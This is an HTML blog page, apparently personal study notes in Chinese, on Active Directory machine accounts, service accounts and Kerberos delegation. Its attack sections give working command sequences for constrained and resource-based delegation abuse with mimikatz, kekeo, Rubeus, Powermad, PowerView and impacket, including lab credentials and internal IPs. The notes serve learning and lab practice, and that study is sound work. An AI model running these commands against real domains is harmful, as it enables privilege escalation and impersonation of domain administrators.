@@ -1,0 +1,747 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="机器账号 机器账户（或计算机账户）是Active Dirctory（AD域）的概念 机器账户在AD里的Computer组里   机器账户的命名规则非常固定，即**计算机名 + $**。归属就是它所在域的域名 机器账户是有密码的。一般是120个字符，由Windows自动随机生成，默认每30天自动轮换一次 计算机在开机连接域网络时，会在后台自动使用这个密码向域控制器进行身份验证，因此进行正常业务不需要">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2026/04/01/%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E4%B8%8E%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="机器账号 机器账户（或计算机账户）是Active Dirctory（AD域）的概念 机器账户在AD里的Computer组里   机器账户的命名规则非常固定，即**计算机名 + $**。归属就是它所在域的域名 机器账户是有密码的。一般是120个字符，由Windows自动随机生成，默认每30天自动轮换一次 计算机在开机连接域网络时，会在后台自动使用这个密码向域控制器进行身份验证，因此进行正常业务不需要">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-03-31T16:58:57.916Z">
+<meta property="article:modified_time" content="2026-03-16T17:06:19.945Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="机器账户">
+<meta property="article:tag" content="委派">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-01 00:58" pubdate>
+          2026年4月1日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          21 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header"></h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="机器账号"><a href="#机器账号" class="headerlink" title="机器账号"></a>机器账号</h3><ul>
+<li>机器账户（或计算机账户）是<code>Active Dirctory</code>（<code>AD</code>域）的概念<ul>
+<li>机器账户在<code>AD</code>里的<code>Computer</code>组里</li>
+</ul>
+</li>
+<li>机器账户的命名规则非常固定，即**计算机名 + <code>$</code>**。归属就是它所在域的域名</li>
+<li>机器账户是<strong>有密码的</strong>。一般是<strong>120个字符</strong>，由<code>Windows</code>自动随机生成，默认每30天自动轮换一次</li>
+<li>计算机在开机连接域网络时，会在后台自动使用这个密码向域控制器进行身份验证，因此进行正常业务不需要知道密码</li>
+<li>主要用于计算机与域控制器之间的安全通信（比如更新组策略），以及计算机层面上的相互认证</li>
+<li>域内<strong>任何一个</strong>普通的低权限人类用户，都有权<strong>向域内添加最多10台计算机</strong>（即创建10个机器账户）</li>
+</ul>
+<h3 id="服务账户"><a href="#服务账户" class="headerlink" title="服务账户"></a>服务账户</h3><ul>
+<li>创建一个服务账号就是<strong>把一个普通的域账户注册为服务账户</strong>（<strong>绑定一个</strong><code>SPN</code>）</li>
+<li>可能有弱口令，导致能进行<code>Kerberoasting</code>攻击（[[Kerberoasting攻击]]）</li>
+</ul>
+<h3 id="委派属性"><a href="#委派属性" class="headerlink" title="委派属性"></a>委派属性</h3><ul>
+<li>委派是域环境的一种机制，即A去B请求服务，B用A的身份向C请求服务<ul>
+<li><code>B</code>是<strong>具有委派属性</strong>的账户</li>
+</ul>
+</li>
+<li>域控允许<strong>机器账户</strong>（也称主机账户）或<strong>服务账户</strong>（有些服务在安装时会在域内自动注册服务账号）配置委派属性</li>
+</ul>
+<h4 id="不同的委派属性"><a href="#不同的委派属性" class="headerlink" title="不同的委派属性"></a>不同的委派属性</h4><ul>
+<li>[[域]]</li>
+</ul>
+<h5 id="servicePrincipalName"><a href="#servicePrincipalName" class="headerlink" title="servicePrincipalName"></a>servicePrincipalName</h5><ul>
+<li>[[凭据与票据]]（这个不是委派属性）</li>
+</ul>
+<h5 id="userAccountControl-UAC-属性"><a href="#userAccountControl-UAC-属性" class="headerlink" title="userAccountControl(UAC 属性)"></a>userAccountControl(UAC 属性)</h5><ul>
+<li><code>AD</code>中的核心属性，是一个位掩码</li>
+<li>当这个属性中的 <code>TRUSTED_FOR_DELEGATION</code> (数值 524288) 标志位被勾选时，代表这台机器开启了<strong>非约束委派</strong></li>
+</ul>
+<h5 id="msDS-AllowedToDelegateTo"><a href="#msDS-AllowedToDelegateTo" class="headerlink" title="msDS-AllowedToDelegateTo"></a>msDS-AllowedToDelegateTo</h5><ul>
+<li>传统<strong>约束委派</strong>的核心，是一个字符串列表</li>
+<li>配置在<strong>前端服务器</strong>上，记录了可委派服务的<code>SPN</code></li>
+<li>需要极高的域管权限才能配置（<code>SeEnableDelegationPrivilege</code>），且不够灵活</li>
+<li>宪政了前端服务器的目的地服务</li>
+</ul>
+<h5 id="msDS-AllowedToActOnBehalfOfOtherIdentity"><a href="#msDS-AllowedToActOnBehalfOfOtherIdentity" class="headerlink" title="msDS-AllowedToActOnBehalfOfOtherIdentity"></a>msDS-AllowedToActOnBehalfOfOtherIdentity</h5><ul>
+<li><code>RBCD</code>（<code>Resource-Based Constrained Delegation</code>，<strong>基于资源的约束委派</strong>）的核心。</li>
+<li><code>Windows Server 2012</code>引入</li>
+<li>允许代表其他身份进行操作。本质上是一个<strong>访问控制列表（ACL）</strong>。</li>
+<li>用来定义谁有资格代表其它用户来访问自己</li>
+<li><strong>权限配置颠倒过来了，直接配置在目标资源（被访问的机器）身上</strong></li>
+<li>只要对目标机器账户拥有写权限（<code>GenericWrite</code> 等）就可以修改这个属性</li>
+<li>后端资源通过修改自己这个属性来决定信任哪个前端（即委派的控制权交给<strong>拥有被访问资源</strong>的管理员）</li>
+<li>配置：<code>Set-ADComputer</code> 或 <code>Set-ADUser</code> 命令，加上 <code>-PrincipalsAllowedToDelegateToAccount</code> 参数来合法配置</li>
+<li>可以通过修改目标机器的这个属性添加自己完全控制的机器账户来进行<code>RBCD</code>攻击<ul>
+<li>修改后就是委派攻击的流程了</li>
+</ul>
+</li>
+</ul>
+<h4 id="委派攻击（Delegation-Attacks）"><a href="#委派攻击（Delegation-Attacks）" class="headerlink" title="委派攻击（Delegation Attacks）"></a>委派攻击（Delegation Attacks）</h4><ul>
+<li><strong>参考</strong>：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12189#toc-6">浅谈约束委派攻击-先知社区</a></li>
+<li><strong>参考</strong>：<a target="_blank" rel="noopener" href="https://forum.butian.net/share/1591">奇安信攻防社区-红队域渗透技术：委派攻击汇总（全）</a></li>
+<li>在域环境中，如果配置不当，攻击者可以滥用机器账户的委派属性，伪造域管的凭证。</li>
+<li>如果机器配置了<strong>非约束委派</strong>，任何访问这台机器的用户，都会把自己的凭据留在机器上。如果拿下了这台机器，就能获得这些凭据，<strong>不安全性高</strong></li>
+<li>如果是配置了<strong>约束委派</strong>，就能通过已知密码的普通账户，利用协议漏洞伪造高权限票据，通过委派机制进行攻击<ul>
+<li>约束委派是对<code>Kerberos</code>的拓展，<strong>引入</strong>了<code>S4U</code>，是为了在委派种限制委派账户对特定服务的访问。约束委派分为<strong>仅使用</strong><code>Kerberos</code>，不能进行协议转换和<strong>使用任何身份验证协议</strong><ul>
+<li><code>S4U</code>支持两个子协议：都允许<strong>服务代表用户</strong>从<code>KDC</code>请求<code>ST</code><ul>
+<li><code>Service for User to Self</code> (<code>S4U2Self</code>)：可以<strong>代表自身</strong>请求<strong>针对其自身</strong>的<code>Kerberos ST</code></li>
+<li><code>Service for User to Proxy</code> (可以以用户的名义请求其它服务的<code>ST</code>)：可以<strong>以用户的名义</strong>请求其它服务的<code>ST</code><ul>
+<li>约束委派<strong>限制</strong>了<code>S4U2Self</code>扩展的范围，使得配置了委派属性的服务只能模拟用户身份访问特定的其他服务</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>能伪造高权限用户的原因</strong>：向域控申请票据的时候走的是<code>NTDS.dit</code>里的认证而不是本地机器<code>SAM</code>里的认证，而<code>AD</code>数据库里只有一个管理员，那就是域管<ul>
+<li><strong>Kerberos 是域级别的协议：</strong> 域控只负责管理和签发<strong>域内对象</strong>（域用户、域计算机）的身份凭证</li>
+<li>本地账号归机器自己管，域控不知道它们的密码，也<strong>无法为本地账号签发 Kerberos 票据</strong></li>
+</ul>
+</li>
+<li><code>S4U2Self</code>和<code>S4U2proxy</code>的请求过程<br>![[19.webp]]</li>
+</ul>
+<h4 id="域委派流程"><a href="#域委派流程" class="headerlink" title="域委派流程"></a>域委派流程</h4><h5 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h5><ul>
+<li>以服务账户为例（域内认证是通过<code>Kerberos</code>[[凭据与票据]])</li>
+</ul>
+<ol>
+<li>域内用户<code>A</code>向服务账户<code>B</code>去请求<code>C</code>服务，并提供访问<code>B</code>的<code>ST1</code></li>
+<li><code>B</code>使用<strong>自己的</strong><code>TGT</code>和<code>A-&gt;B</code>的<code>ST1</code>的向<code>KDC</code>发起<code>A</code>的票据申请</li>
+<li><code>KDC</code>验证<code>B</code>的委派属性且申请的服务<code>C</code>在允许表中，则通过<code>TGS</code>返回<code>A</code>访问<code>C</code>的授权服务票据<code>ST2</code></li>
+<li><code>B</code>用<code>A</code>的<code>ST2</code>去访问服务<code>C</code></li>
+</ol>
+<ul>
+<li><p>借图：<br>![[18.png]]</p>
+</li>
+<li><p>由于<code>B</code>只能获取<code>A</code>的<code>ST1</code>而不能拿到<code>TGT</code>，因此只能模拟<code>A</code>去访问特定的服务，但如果拿到<code>B</code>的<code>TGT</code>|明文密码|<code>NTLM Hash</code>就能去伪造<code>S4U</code>请求，且只需要<code>A</code>的用户名</p>
+</li>
+</ul>
+<h6 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 导出票据</span><br>mimikatz：sekurlsa::tickets /export<br><span class="hljs-comment">## mimikatz命名规则：[会话ID]-&lt;票据标志&gt;-&lt;加密类型&gt;-&lt;客户端名&gt;@&lt;服务名&gt;-&lt;域名&gt;.kirbi</span><br><span class="hljs-comment">### 服务名是krbtgt说明是 TGT</span><br><span class="hljs-comment">### 客户端名需要是控制的服务账户</span><br><br><span class="hljs-comment">## 票据清空的情况下获取TGT</span><br><span class="hljs-comment">### 使用NTLM Hash</span><br>mimikatz：tgt::ask /user:&lt;服务账户名&gt; /domain:&lt;domain-name&gt; /ntlm:&lt;<span class="hljs-built_in">hash</span>&gt;<br><span class="hljs-comment">#### or</span><br>Rubeus.exe asktgt /user:&lt;服务账户名&gt; /rc4:&lt;NTLM <span class="hljs-built_in">hash</span>&gt; /domain:&lt;domain-name&gt; /dc:DC.&lt;domain-name&gt; /nowrap &gt; 1.txt<br><span class="hljs-comment">### 使用明文密码</span><br>tgt::ask /user:&lt;服务账户名&gt; /domain:&lt;domain-name&gt; /password:&lt;password&gt;<br><span class="hljs-comment">### 使用kekeo</span><br>tgt::ask /user:&lt;服务账户名&gt; /password:&lt;password&gt;|/NTLM:&lt;<span class="hljs-built_in">hash</span>&gt; /domain:&lt;domain-naem&gt; /ticket:xxx.kirbi<br><br><span class="hljs-comment"># 申请ST</span><br>kekeo：tgs::s4u /tgt:&lt;TGT-file&gt; /user:&lt;需要伪造用户的用户名&gt;@&lt;域名&gt; /service:&lt;目标服务SPN&gt;(SPN格式) <br><span class="hljs-comment">## 需要域名的时候在Kerberos协议中建议且绝大多数情况下必须大写</span><br><br><span class="hljs-comment"># ptt攻击，将ST导入内存</span><br>mimikatz：kerberos::ptt &lt;ST-file&gt;<br><span class="hljs-comment">## 直接用Rubeus完成申请ST和导入内存</span><br>Rubeus.exe s4u /impersonateuser:&lt;username&gt; /msdsspn:&lt;目标服务SPN&gt; /dc:DC.&lt;domain-name&gt; /ptt /ticket:&lt;TGT&gt;<br><br><span class="hljs-comment"># 访问域服务 [[SMB与CIFS]]</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h5 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h5><ul>
+<li>在设置相关的约束委派的实现的时候不再需要域管理员自己去设置相关约束委派的属性，而操作权落在了当前登录的机器或者用户的手中</li>
+<li>约束性委派不能跨域进行委派，基于资源的约束性委派可以跨域和林</li>
+<li>不再需要域管理员权限设置委派，只需拥有在计算机对象上编辑<code>msDS-AllowedToActOnBehaffOtherldentity</code>属性权限将计算机加入域的域用户和机器自身拥有权限（<strong>添加服务A的SID</strong>，达到让服务<code>A</code>模拟用户访问<code>B</code>资源的目的）</li>
+</ul>
+<h6 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h6><ol>
+<li>具有对主机修改<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的权限(如已经控制的主机是<code>WEB</code>则具有修改<code>WEB</code>主机的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>的权限账户)</li>
+<li>可以创建机器账户的域用户（或已知机器账户）</li>
+<li><code>GenericWrite</code>的权限???</li>
+</ol>
+<h6 id="什么用户能修改这个属性"><a href="#什么用户能修改这个属性" class="headerlink" title="什么用户能修改这个属性"></a>什么用户能修改这个属性</h6><ul>
+<li><strong>将主机加入域的用户</strong>(账户中有一个<code>mSDS-CreatorSID</code>属性，用于标记加入域时使用的用户的<code>SID</code>值，反查就可以知道是谁把机器加入域的了)<ul>
+<li>[[域]]<strong>域机器</strong></li>
+</ul>
+</li>
+<li><code>Account Operator</code>组成员</li>
+<li><strong>该主机的机器账户</strong><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建一个test机器账户用户</span><br>Set-ExecutionPolicy Bypass -Scope Process<br>import-module .\Powermad.ps1<br>New-MachineAccount -MachineAccount test1 -Password $(ConvertTo-SecureString <span class="hljs-string">&quot;123456&quot;</span> -AsPlainText -Force)<br><br><span class="hljs-comment">## 查看是否添加和sid</span><br>net group /domain<br>import-module .\PowerView.ps1<br>Get-NetComputer [&lt;username&gt;] -Properperties objectsid<br><br>wmic useraccount get name,domain,sid<br><br><span class="hljs-comment">## 设置委派和这个服务的msds-allowedtoactonbehalfofotheridentity的值</span><br>Set-ExecutionPolicy Bypass -Scope Process<br>import-module .\powerview.ps1<br><span class="hljs-variable">$SD</span> = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="hljs-string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;&lt;sid&gt;)&quot;</span><br><span class="hljs-variable">$SDBytes</span> = New-Object byte[] (<span class="hljs-variable">$SD</span>.BinaryLength)<br><span class="hljs-variable">$SD</span>.GetBinaryForm(<span class="hljs-variable">$SDBytes</span>, 0)<br>Get-DomainComputer WEB| Set-DomainObject -Set @&#123;<span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="hljs-variable">$SDBytes</span>&#125; -Verbose<br><br><span class="hljs-comment">### 查询是否修改成功</span><br>Get-DomainComputer WEB -Properties msds-allowedtoactonbehalfofotheridentity<br><span class="hljs-comment">### 清除该属性的值</span><br>Set-DomainObject WEB -Clear <span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span> -Verbose<br><br><br><span class="hljs-comment"># 申请username2的CIFS的ST票据(也可以用上面的方法)</span><br>impacket-getST.py -spn cifs/主机名 -impersonate 要伪造的用户的用户名 -hashes :&lt;<span class="hljs-built_in">hash</span>&gt;(username的) &lt;domain-name&gt;/username -dc-ip ip<br><span class="hljs-comment">## 需要配置环境变量和DNS解析</span><br><span class="hljs-built_in">export</span> KRB5CCNAME=xxx.ccache<br><span class="hljs-comment">### /etc/hosts 将对应机器和其主机域名对应上(非内网环境，配了代理也得配这个)</span><br><span class="hljs-comment">#### 因为不能直接用IP连，.ccache票据中不存储IP而是主机域名，所以必须使用主机域名连接</span><br><span class="hljs-comment">#### 但攻击机上没有域名对应的解析IP，所以要配置DNS解析</span><br><br><span class="hljs-comment">## 连接</span><br>impacket-wmiexec -k &#123;&lt;domain-name&gt;/administrator@&lt;hostname&gt;&#125;|&#123;hostname-domain-name&#125; -no-pass -dc-ip 10.150.127.166<br>impacket-wmiexec -k XR-0687.xiaorang.lab -no-pass -dc-ip 10.150.127.166<br>impacket-wmiexec -k &#123;&lt;domain-name&gt;/administrator@&lt;hostname&gt;&#125;|&#123;hostname-domain-name&#125; -no-pass -dc-ip 10.150.127.166<br><br>impacket-psexec -k &#123;&lt;domain-name&gt;/administrator@&lt;hostname-domain-name&gt;&#125;|&#123;hostname-domain-name&#125; -no-pass<br><br><br><br></code></pre></td></tr></table></figure></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 直接完成创建账户等流程</span><br>proxychains4 impacket-addcomputer -method SAMR xiaorang.lab/lixiuying:winniethepooh -computer-name abc123$ -computer-pass <span class="hljs-string">&#x27;1234@abc&#x27;</span> -dc-ip 172.22.15.13<br><span class="hljs-comment"># 直接完成修改属性流程</span><br>proxychains4 -q impacket-rbcd xiaorang.lab/lixiuying:winniethepooh -action write -delegate-from <span class="hljs-string">&quot;abc123$&quot;</span> -delegate-to <span class="hljs-string">&quot;XR-0687$&quot;</span> -dc-ip 172.22.15.13<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Windows/" class="print-no-link">#Windows</a>
+      
+        <a href="/tags/%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7/" class="print-no-link">#机器账户</a>
+      
+        <a href="/tags/%E5%A7%94%E6%B4%BE/" class="print-no-link">#委派</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>http://example.com/2026/04/01/机器账户与服务账户/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月1日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/04/01/%E5%9F%9F/" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/01/SMB%E4%B8%8ECIFS/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
